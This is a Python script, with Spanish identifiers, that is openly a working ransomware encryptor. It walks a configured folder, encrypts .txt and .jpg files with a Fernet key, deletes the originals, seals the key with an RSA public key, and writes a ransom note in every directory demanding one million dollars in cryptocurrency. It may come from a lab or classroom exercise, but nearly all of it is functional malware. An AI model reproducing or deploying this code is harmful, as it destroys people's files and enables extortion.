import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from Config import CARPETA_OBJETIVO, EXTENSION_BLOQUEO, ARCHIVO_PUB_LLAVE, ARCHIVO_SALIDA_KEY

def cifrar_directorios():
    if not os.path.exists(ARCHIVO_PUB_LLAVE):
        print("ERROR ARCHIVO NO ENCONTRADO")
        return
    
    with open(ARCHIVO_PUB_LLAVE, "rb") as f:
        llave_publica = serialization.load_pem_public_key(f.read())

    clave_fernet = Fernet.generate_key()
    f_obj = Fernet(clave_fernet)

    for raiz, _, archivos in os.walk(CARPETA_OBJETIVO):
        with open(os.path.join(raiz, "HELPME.txt"), "w") as nota:
            nota.write("Tus archivos han sido cifrados. Para recuperarlos, sigue las instrucciones a continuación:\n")
            nota.write("1. Contacta al atacante a través del correo: atacante@example.com\n")
            nota.write("2. Dar 1000000 dólares en criptomonedas para obtener la clave de descifrado.\n")

        for nombre in archivos:
            if nombre.endswith(('.txt','.jpg')) and not nombre.endswith(EXTENSION_BLOQUEO):
                ruta_orig = os.path.join(raiz, nombre)

                try:
                    with open(ruta_orig, "rb") as f:
                        datos = f.read()

                    with open(ruta_orig + EXTENSION_BLOQUEO, "wb") as f:
                        f.write(f_obj.encrypt(datos))

                    os.remove(ruta_orig)
                    print(f"Archivo cifrado: {ruta_orig}")
                except Exception as e:
                    print(f"Error en {ruta_orig}: {e}")

    clave_cifrado_rsa = llave_publica.encrypt(
        clave_fernet,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(ARCHIVO_SALIDA_KEY, "wb") as f:
        f.write(clave_cifrado_rsa)

    print("Cifrado completo")

if __name__ == "__main__":
    if not os.path.exists(CARPETA_OBJETIVO):
        os.makedirs(CARPETA_OBJETIVO)
    cifrar_directorios()